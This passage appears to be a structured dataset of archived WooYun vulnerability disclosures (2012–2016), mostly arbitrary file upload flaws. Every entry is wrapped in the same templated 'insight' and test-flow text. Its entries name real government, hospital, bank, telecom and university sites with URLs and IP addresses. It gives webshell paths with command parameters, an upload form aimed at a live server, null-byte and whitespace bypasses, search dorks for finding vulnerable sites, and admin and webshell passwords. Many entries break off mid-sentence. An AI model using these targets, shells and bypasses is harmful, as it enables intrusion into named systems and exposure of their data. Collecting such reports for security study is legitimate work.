**厂商**: 东大智能 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 后台一处上传功能没有任何访问限制，也没有任何上传类型限制http://www.itsmoe.com/Admin/File.aspx因为东大智能企业的特殊性质，服务器上有众多的网站源码、交通智能化基建设施代码、公司报表等等数据信息大致看了下服务器，已经成了养鸡场，各种马和提权工具，几乎都来自于这个疏忽了的上传漏洞

**POC**: 及时修复吧，一个小小的上传可能已经泄漏了众多网站、设施的源码，造成更大的危害

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-057720] 上海对外经贸大学分站任意文件上传
**厂商**: sis.suibe.edu.cn | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 一句话木马，需要绕过安全狗，上wooyun搜了下，有现成的

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 无
---

---
### [wooyun-2013-043524] 北航course grading系统漏洞(按照名单涉及29所学校)
**厂商**: 北京航空航天大学 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这算是成功入侵事件吧，拿下了北航两台服务器，按照名单上说，还有上海大学计算中心等28所高校在用这个系统，名单：http://www.course.sei.buaa.edu.cn/Users/。另外北航使用的都是1.1.3版本，似乎1.1.6版本这个bug已经修复了，谁知道呢，没人用1.1.6。下面详细讲说一下入侵过程：北航使用这个平台的服务器有两台，一个是http://judge.sei.buaa.edu.cn/，另一个是http://crs.sei.buaa.edu.cn/，测试请到http://crs.sei.buaa.edu.cn/，学号stu，密码stu（这个账号和密码是在http://www.course.sei.buaa.edu.cn/demo/上对外公开的）。废话不多说，漏洞很简单0x00截断上传，古老的漏洞。进入学生页面之后，我们找到在线答疑，随便点开一个论坛，之后发新帖，

**POC**: 数据库user.MYDwebshell

**绕过**: 截断攻击

**修复**: 按照这个过滤jsp文件的方式，我大体估计了一下我们假设有这么一个函数get_type(name)，因为要扫文件扩展名，所以从后往前扫，如果我们在末尾加了一个0x00那么就判断无文件扩展名，而保存文件时，我们是从前往后扫所以遇到0x00就认为字符串结束，所以过滤不掉，那么修复方案很简单，把传递给外部J
---

---
### [wooyun-2012-08732] 快乐购某分站存在用友任意上传漏洞 可提权
**厂商**: 快乐购物股份有限公司 | **年份**: 2012 | **类型**: 成功的入侵事件

**元思考**: 触发信号: 上传功能

**洞察**: 成功的入侵事件防护不足，开发者信任前端输入

**测试流程**:
1. 识别成功的入侵事件相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 快乐购某分站存在用友任意上传漏洞 可提权我也不多说了 管理员也最近怎么也不给我审核了 晕啊

**POC**: 看到没 根目录 有木有

**绕过**: 直接利用

**修复**: 快乐购公司 有专门做安全的人么？
---

---
### [wooyun-2014-067391] 万户OA任意文件上传导致代码执行（多处总结）
**厂商**: cncert | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: /defaultroot/public/editor/tpsc.jsp/defaultroot/public/editor/1_tpsc.jsp/defaultroot/work_flow/formOptJSPUpload.jsp/defaultroot/work_flow/formStartJSPUpload.jsp/defaultroot/govezoffice/custom_documentmanager/smartUpload.jsp?path=innerMailbox&fileName=innerMailFileName&saveName=innerMailSaveName&tableName=innerMaildisplaytable&fileMaxSize=0&fileMaxNum=0&fileType=&fileMinHeight=0&fileMinWidth=0&file

**POC**: \defaultroot\customize\upload.jsp （需截断doc）\defaultroot\information_manager\informationmanager_upload.jsp （无限制直接上传）\defaultroot\work_flow\workflow_upload.jsp （无过滤，报错前已经执行成功，鸡肋未返回文件名可以根据时间暴力采集）\defaultroot\dragpage_department\upload.jsp （需截断jpg）\defaultroot\skin\5\dragpage_department\upload.jsp  （需截断j

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-078494] 某三级甲等医院遍历目录和fck上传漏洞
**厂商**: 桂林市医学院附属医院 | **年份**: 2014 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 上传功能

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某三级甲等医院遍历目录和fck上传漏洞遍历目录存在第二根目录，比如/fckeditor  ....等等fck上传地址：http://hospital.glmc.edu.cn/fckeditor//editor/filemanager/connectors/test.html

**POC**: 某三级甲等医院遍历目录和fck上传漏洞遍历目录存在第二根目录，比如/fckeditor  ....等等fck上传地址：http://hospital.glmc.edu.cn/fckeditor//editor/filemanager/connectors/test.html

**绕过**: 直接利用

**修复**: 医院请注重网站安全
---

---
### [wooyun-2013-019833] 99旅馆连锁酒店cookie欺骗+上传漏洞
**厂商**: 99旅馆连锁酒店 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、使用webtextbox编辑器：2、管理路径泄露：

**POC**: 1、cookie欺骗演示：/* 因IIS为7.5版本，上传xx.asp;1.jpg再结合iis6.0解析漏洞，再此不使用，正因此发现另一0day，该编辑器可以绕过上传限制，轻易上传webshell。*/2、上传漏洞演示：成功cookie欺骗后，原页面-高级设置、发现默认图片上传只允许上传jgp、gif、png三种格式通过firebug将disabled="diabled"替换成enabled="enabled"，value="jpg,gif,png,aspx"3、上传webshell演示：

**绕过**: 直接利用

**修复**: 你们比我懂！亲，有礼物送没。
---

---
### [wooyun-2016-0214735] 财政部某站任意文件上传
**厂商**: 财政部 | **年份**: 2016 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 财政部，代理机构入账入口，注册，会有附件上传，抓包发现仅仅需要改变文件后缀即可达到任意文件上传，上传地址那边有显示目录，但是改变目录即可执行恶意代码。

**POC**: 代理机构入口那边附件上传上传文件所在目录修改目录的，那修改过后缀的恶意代码即可执行.表示权限挺大的shell 地址http://**.**.**.**/file//0/1234_201605311057570836.jsp不敢深入了.话说事关国家财务部，纳税人民交税给给国家，国家的人才也.......这也太

**绕过**: 直接利用

**修复**: 上传过滤规则需谨慎
---

---
### [wooyun-2013-039563] 中国电信某后台文件上传导致代码执行
**厂商**: 中国电信 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞站点http://219.153.32.161/漏洞详情及利用方法http://hi.baidu.com/huting/item/ea77c29727803f9e58146199上传小马http://219.153.32.161/a/pwn.jsp?cmd=whoamihttp://219.153.32.161/a/pwn.jsp?cmd=ipconfighttp://219.153.32.161/a/pwn.jsp?cmd=systeminfohttp://219.153.32.161/a/pwn.jsp?cmd=dir不想截图了。

**POC**: http://219.153.32.161/a/pwn.jsp?cmd=whoamihttp://219.153.32.161/a/pwn.jsp?cmd=ipconfighttp://219.153.32.161/a/pwn.jsp?cmd=systeminfohttp://219.153.32.161/a/pwn.jsp?cmd=dir可以修改里面的war文件，直接上传大马。

**绕过**: 直接利用

**修复**: 。。。。。。
---

---
### [wooyun-2015-0111404] 用友某重要系统任意文件上传漏洞之一（无需登陆）
**厂商**: seeyon.com | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 参数注入, 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 用友GRP-U8 财务管理软件该servlet存在漏洞，可通过GET参数fileName控制上传的文件名/servlet/FileUpload随便构造一个表单，上传任意文件即可<html><form method="post" action="http://210.44.112.101/servlet/FileUpload?fileName=t.jsp&actionID=update" encType="multipart/form-data"><input type="file" name="rfile_name"/><input type="submit" value="upload"/></form></html>上传后的最终路径为：/R9iPortalhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/+fileName参数的

**POC**: http://210.44.112.101/R9iPortalhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/t.jsp chopper

**绕过**: 直接利用

**修复**: 严格过滤
---

---
### [wooyun-2012-05655] 建站之星(SiteStar)网站建设系统：SiteStar V2.2 上传漏洞
**厂商**: 上海美橙科技 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://qiche11a36.site3.sitestar.cn/qiche11a36/wwwroot/admin/FCKeditor/editor/fckeditor.html没设置权限

**POC**: 我就在虚礼机测试 SiteStar V2.2

**绕过**: 直接利用

**修复**: 设置访问权限
---

---
### [wooyun-2015-0108823] 万户ezOFFICE一处任意文件上传漏洞
**厂商**: 国家互联网应急中心 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这个文件虽然多，但好像没有人提交这个目录下的啊？厂商：http://www.whir.net/index.html  北京万户网络技术有限公司上传点：/defaultroot/extension/smartUpload.jsp?path=information&fileName=infoPicName&saveName=infoPicSaveName&tableName=infoPicTable&fileMaxSize=0&fileMaxNum=0&fileType=gif,jpg,bmp,jsp,png&fileMinWidth=0&fileMinHeight=0&fileMaxWidth=0&fileMaxHeight=0Case:http://oa.tlchem.com.cn:7001/http://oa.elyl.com.cn:7001//http://61.132.136.122

**POC**: 小小的测试一下：Shell in /defaultroothttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/information/****.jsp

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-080413] BOBO官网续渗透后的沦陷
**厂商**: BOBO官网 | **年份**: 2014 | **类型**: 服务弱口令

**元思考**: 触发信号: 上传功能

**洞察**: 服务弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别服务弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 之前提交了任意上传漏洞导致服务器沦陷WooYun: BOBO官网存在任意文件上传导致服务器沦陷时间原因就没继续，过后用NMAP扫了下C段的3389，发现C段几台服务器用的是相同密码，就这样又拿了两台服务器的权限...依旧只截图证明，未做任何操作

**POC**: 同上

**绕过**: 直接利用

**修复**: 增强密码，提高安全意识
---

---
### [wooyun-2014-054238] 某政府类CMS通用任意文件上传+目录遍历
**厂商**: Cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: #1.今天是改善Gov安全的第五课！------该CMS主要是存在一个JSP的Fckeditor导致了任意文件上传，并且毫无限制地存在目录遍历，想看什么就看什么~关键字比较难构造，如下：inurl:u***es inurl:index.jspinurl:do***?siteid#2.根据该关键字可以发现，存在大量的这样的政府网站~其漏洞主要表现在Fckeditor的编辑上，地址如下：fckeditor/editor/filemanager/browser/default/browser.html?Type=../../..&Connector=connectors/jsp/connector以下枚举十例，【注意】仅提供给Cncert进行复现测试，其它人员请勿对提供的网站此进行利用或破坏，否则后果自负!：http://www.wuzhi.gov.cn/fckeditor/editor/fil

**POC**: #3.以最后一例子来做测试，我们看看Fck编辑器带来的危害！可泄漏大量敏感信息！危害可想而知！看下面的图，完全可以遍历网站所有目录内容，包括一些敏感的文件信息！#4.测试是否能成功上传JSP脚本，成功上传zone.jsp

**绕过**: 直接利用

**修复**: PS:以上测试为证明漏洞危害，Shell已删除，请勿跨省，改善Gov安全，是我们白帽子的职责！原来我终于知道为什么中国那么多政府网会被外国黑客黑了！原来是这么简单！例如由某生产厂商提供自己写的CMS然后给批量的政府网安装，而该CMS存在一个漏洞导致所有网站沦陷！
---

---
### [wooyun-2015-098172] IDL-EDT30学位论文管理系统任意文件上传
**厂商**: 国家互联网应急中心 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 案例如下：http://202.201.152.23:8080/idl30/admin/ftb.imagegallery.aspxhttp://qhbfm.jiehr.com.cn/admin/ftb.imagegallery.aspxhttp://211.86.245.155/admin/ftb.imagegallery.aspxhttp://lib.uir.cn:808/idl/admin/ftb.imagegallery.aspxhttp://61.167.120.67:8080/IDLWEB//admin/ftb.imagegallery.aspxhttp://xwlw.zju.edu.cn/idl/admin/ftb.imagegallery.aspxhttp://202.119.248.241/idl30//admin/ftb.imagegallery.aspxhttp://2

**POC**: 1.测试案例：http://202.201.152.23:8080/idl30/admin/ftb.imagegallery.aspx

**绕过**: 直接利用

**修复**: 对文件扩展名重命名操作。
---

---
### [wooyun-2015-0134902] 某旅馆业治安管理信息系统任意文件上传漏洞
**厂商**: 公安部一所 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 从上个漏洞得知有任意文件上传漏洞WooYun: 某省旅馆业治安管理信息系统任意文件上传漏洞（可能影响全省住店记录）应该还存在着别的上传页面，找了一会，找到了另一个上传的页面http://xxx/SysFun/UploadPic.htm存在该漏洞的网站：http://bc.jlslgy.com/http://sp.jlslgy.com/http://sy.jlslgy.com/http://th.jlslgy.com/http://yb.jlslgy.com/http://bs.jlslgy.com/http://cb.jlslgy.com/http://ly.jlslgy.com/

**POC**: 例子：任意文件上传页面http://bc.jlslgy.com/SysFun/UploadPic.htm直接上传一个txt文档，抓包进行修改。上传到的目录：/UploadFile/http://bc.jlslgy.com/UploadFile/1.aspx菜刀连接点到为止

**绕过**: 直接利用

**修复**: 过滤，限制上传类型。
---

---
### [wooyun-2015-0146316] 网站安全狗文件上传绕过(Windows+apache)
**厂商**: 安全狗 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 上传功能

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这个利用方法，我觉得很多人都可能用过，而且安全狗应该不会出现这种情况，但是在我的测试环境里最新版本的安全狗测试通过。网站安全狗（APACHE版）for Windows测试主程序版本：3.5.11730测试网马库版本：2015-10-08测试环境：vmware Windows xp sp3，apache+php+mysql集成环境测试过程如下：尝试了已公开的很多方法，其中有一个没修复，以后再说吧，这次先说这个，很简单而且很常用的绕过方式，就是：空白符绕过。比如构造如下形式：12.php .12.asp .12.aspx .12.cer .点号前面是一个空格或多个空格，或者回车符，点号可有可无。先绕过黑名单机制及检测机制，在Windows服务器上保存的时候空格都被去掉了。比较奇怪，通过一些特殊方法（特殊字符构造）也能在服务端生产后缀包含空格的文件名（当然这也没法解析）。1）Content-Di

**POC**: 参考详细说明。

**绕过**: 过滤绕过

**修复**: 目前还是黑盒摸索，没研究过代码，你们比更懂。
---

---
### [wooyun-2013-036642] 订餐网站安全漏洞之三-978外卖订餐系统任意文件上传漏洞
**厂商**: 978外卖订餐网 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 978外卖订餐系统上传漏洞一枚

**POC**: 1，shell2，database3，admin——order

**绕过**: 直接利用

**修复**: 全面修复。做定制处理
---

---
### [wooyun-2013-018798] 万达某分站任意文件上传
**厂商**: 大连万达集团股份有限公司 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 存在问题站点：万达商业规划研究院地址：http://www.wdghy.com/webpage/column/regist1.shtml打开抓包软件，点上传。发现无任何网络数据，那说明是本地判断，那就好说了。代理，burp修改后缀，上传。貌似作品简介还没有任何过滤，直接可以传～大意啊大意～

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 服务端过滤。删除留下的马儿～
---

---
### [wooyun-2012-07146] 上海农商银行客服平台上传漏洞
**厂商**: 上海农商银行 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 用友icc客服系统 你们懂的

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-013505] ThinkSNS 2.8 上传任意文件漏洞
**厂商**: ThinkSNS | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 微博上传图片时只在前端进行验证, 服务器端没有进行安全过滤。\api\StatusesApi.class.phpfunction uploadpic(){if( $_FILES['pic'] ){//执行上传操作$savePath =  $this->_getSaveTempPath();$filename = md5( time().'teste' ).'.'.substr($_FILES['pic']['name'],strpos($_FILES['pic']['name'],'.')+1);if(@copy($_FILES['pic']['tmp_name'], $savePath.'/'.$filename) || @move_uploaded_file($_FILES['pic']['tmp_name'], $savePath.'/'.$filename)){$result['b

**POC**: 在登录thinksns官方微博后,构建以下表单:<form action="http://t.thinksns.com/index.php?app=w3g&mod=Index&act=doPost" method="post" enctype="multipart/form-data" /><textarea name="content">test</textarea>file: <input id="file" type="file" name="pic" /><input type="submit" value="Post" /></form>去掉缩略图的前缀(small_ )

**绕过**: 直接利用

**修复**: \api\StatusesApi.class.phpfunction uploadpic(){/*** 20121018 @yelo* 增加上传类型验证*/$pathinfo = pathinfo($_FILES['pic']['name']);$ext = $pathinfo['extension
---

---
### [wooyun-2015-0150192] 某通用系统任意文件上传漏洞（多个政府网站）
**厂商**: 杭州孚立计算机软件有限公司 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: google hackingintext:技术支持:杭州孚立计算机软件有限公司附送几个案例**.**.**.**:8080/publichttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/file.jsphttp://**.**.**.**//publichttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/file.jsphttp://**.**.**.**/publichttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/file.jsphttp://**.**.**.**/publichttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/file.jsphttp://*

**POC**: 选一个漏洞证明上传时候不能直接上传jsp，但是用一个空格就直接绕过了，应该直接是黑名单检测吧返回包里也很友好的返回路径，么么哒大马地址 **.**.**.**/public/files/201510/5474453920151028082314.jsp密码：sec再传个菜刀马 http://**.**.**.**/public/files/201510/css1.jsp密码：cmd

**绕过**: 直接利用

**修复**: 白名单上传后缀过滤后缀重命名后缀未授权不能访问上传页面
---

---
### [wooyun-2015-0144283] 择校网存在任意文件/目录遍历
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 上传功能

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/fckeditor/editor/filemanager/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=File&CurrentFolder=c:/查看C盘文件http://**.**.**.**/FCKeditor/editor/filemanager/browser/default/browser.html?&Connector=../../connectors/aspx/connector.aspx文件上传

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 快升级吧，一堆漏洞
---

---
### [wooyun-2012-05201] 拿下方卡在线详细情况
**厂商**: 方卡在线 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 客服给出在线考试系统测试后台后台上传控制不严后台上传设置 过滤ASP  但是可以用 AASPSP 突破权限设置不严导致拿下整个站点 以及其它分站

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 禁止上传ASP 等上传目录权限设置你懂的
---

---
### [wooyun-2014-084746] 西安人民政府网存在上传漏洞
**厂商**: 西安市人民政府 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 西安人民政府网存在上传漏洞手拿御剑走天下。。。。。。。。。。！！！！！！huodong.xa.gov.cn

**POC**: 偶然发现了这个目录然后继续然后剩下的就不做了。。。。。。。。

**绕过**: 直接利用

**修复**: 你们比我懂
---

---
### [wooyun-2012-014632] 珍爱网文件上传
**厂商**: 珍爱网 | **年份**: 2012 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 上传功能

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上传地址，http://2012.zhenai.com/ckfinder/ckfinder.html可惜不是iis啊！但是对本目录的文件，可以增删改减：

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-033041] 四川省食品安全委员会主站执行
**厂商**: 四川省食品安全委员会 | **年份**: 2013 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 菊花：http://www.scfs.gov.cn/article/loadArticleHtml.action

**POC**: (见原文)

**绕过**: 直接利用

**修复**: =
---

---
### [wooyun-2015-0115681] 一则新闻引发的血案某跑路P2P网贷我该如何相信你
**厂商**: cnmeidai.com | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 美贷坑用户的新闻一直没有断，直接昨天凤凰财经还在提醒用户，不要上当，不要上当可是这样的一个网站，到现在竟然还开着，而且还能融资，还能投资，这样一个坑人的网站，为什么到现在还没有人把它取缔？难道需要白帽子出手吗？可是如果我把它取缔了，我和黑客有什么两样？政府难道不能管管吗？

**POC**: 1.github找到cnmeidai的uckey2.通过uckey，修改了配置文件，拿到一句话shelluckey拿shell可看这里：WooYun: 某分站泄漏数据库信息和uc_key等信息，可getshell3.拿到服务器权限主站和bbs都在同一个服务器

**绕过**: 直接利用

**修复**: 好想直接把网站给删了
---

---
### [wooyun-2014-086102] 临夏回族自治州人民检察院某上传漏洞
**厂商**: 临夏回族自治州人民检察院 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 临夏回族自治州人民检察院某上传漏洞。已成养马场！！上传点：http://www.lxzjc.gov.cn/jubao/admin/FCKeditor/editor/filemanager/connectors/test.html#

**POC**: 可getshell.

**绕过**: 直接利用

**修复**: ，，，，，，，
---

---
### [wooyun-2015-0108024] 健康之路旗下产品多个漏洞导致沦陷（泄露大量患者信息）
**厂商**: 健康之路 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.先看后台弱口令http://admin.yihu.com/ 用户名admin 密码111111用户预约信息2.后台很多注入，随便找一个示例这里注入随便跑一下，后面有上传漏洞控制整个数据库3.看无边界医疗系统的越权，可遍历orgID查看所有预约的患者信息。POST /WbjUI/wbj2/business/yyqd_doAll.do HTTP/1.1Host: y.yihu.cnApi=ghzy.ArrangeInfoApi.queryDayPrintList&Param=%7B%22orgID%22%3A1023577%2C%22deptID%22%3A0%2C%22userSN%22%3A0%2C%22name%22%3A%22%22%2C%22cardID%22%3A%22%22%2C%22mobile%22%3A%22%22%2C%22currentPage%22%3A1%2C%

**POC**: 4.还是看另外一个站上传吧，来得快些。http://doctor.yihu.com/Myapps.aspx过滤了，没关系 ，上传图片抓包，在里面插入一句话成功上传。结果是各种 数据库。

**绕过**: 直接利用

**修复**: 各种修复
---

---
### [wooyun-2015-0154360] 西北民族大学某处任意文件上传漏洞导致服务器沦陷
**厂商**: 西北民族大学 | **年份**: 2015 | **类型**: 后台弱口令

**元思考**: 触发信号: 功能测试

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/zsxx/webedit/admin_login.asp  admin admin都已经到服务器了，哪个eweb漏洞我就不截图了。**.**.**.**/sbglzx/admin/editor/admin_login.asp admin 974168625

**POC**: **.**.**.**/sbglzx/admin/aspx.aspx

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-023715] 美图秀秀又一分站任意上传
**厂商**: 美图秀秀 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 看到这个WooYun: 美图秀秀分站任意上传我感觉还会有洞，几分钟的测试，果然还有，哈哈哈~~~成因应该和那个是一样的。http://kaka.meitu.com/20100214/step1.php# 这里

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 我怎么感觉还会有啊，哈哈
---

---
### [wooyun-2015-099385] 中国新闻网某分站上传漏洞
**厂商**: 中国新闻网 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中国新闻网某分站编辑器上传漏洞

**POC**: 对中国新闻网某C段扫描发现这个网站http://stat.cns.com.cn/这是某业务统计系统，尝试很多弱口令都不对 ，，对网站进行扫描http://stat.cns.com.cn/js/fckeditor/editor/filemanager/connectors%2Fphp%2Fconnector.php?Command=GetFoldersAndFiles&Type=File&CurrentFolder=/发现有FCKediotr版本是2.6.4乌云上曾爆出这个版本的漏洞WooYun: fckeditor <= 2.6.4 任意文件上传漏洞使用漏洞EXPhttp://stat.cns

**绕过**: 直接利用

**修复**: 你们懂得~求礼物
---

---
### [wooyun-2014-080444] 福建省第二人民医院上传漏洞
**厂商**: 福建省第二人民医院 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 编辑器地址:http://www.fjhospital.com/fckeditor/editor/filemanager/connectors/test.html

**POC**: 漏洞证明

**绕过**: 直接利用

**修复**: 删除即可。
---

---
### [wooyun-2013-026831] 广东省肇庆市国土资源局JBOSS任意文件上传漏洞
**厂商**: 广东省肇庆市国土资源局 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试
